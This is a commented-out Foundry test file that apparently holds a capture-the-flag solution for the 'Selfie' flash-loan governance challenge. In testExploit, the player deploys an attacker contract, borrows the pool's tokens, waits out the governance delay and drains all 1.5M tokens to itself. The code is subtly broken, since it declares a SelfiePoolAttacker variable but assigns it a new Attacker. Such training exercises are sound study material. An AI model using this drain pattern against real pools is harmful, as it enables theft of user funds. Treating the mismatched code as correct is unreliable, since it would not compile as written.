/*
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../Util.sol";
import {SimpleGovernance, SelfiePool} from "../../src/selfie/SelfiePool.sol";
import "../../src/DamnValuableTokenSnapshot.sol";
import "./Attacker.sol";

contract SimplePoolTest is Test{
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    Util util = new Util();
    address payable deployer;
    address payable player;

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    function setUp() public{
        address payable[] memory users = util.createUsers(2);
        deployer = users[0];
        player = users[1];

        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));

        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(token), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function testExploit() public{
        // CODE YOUR SOLUTION HERE
        vm.startPrank(player);
        SelfiePoolAttacker attacker = new Attacker(address(pool), address(governance), address(token));
        attacker.attack(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        attacker.executeAction();
        vm.stopPrank();
        validation();
    }

    function validation() public{
        assertEq(token.balanceOf(address(player)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
*/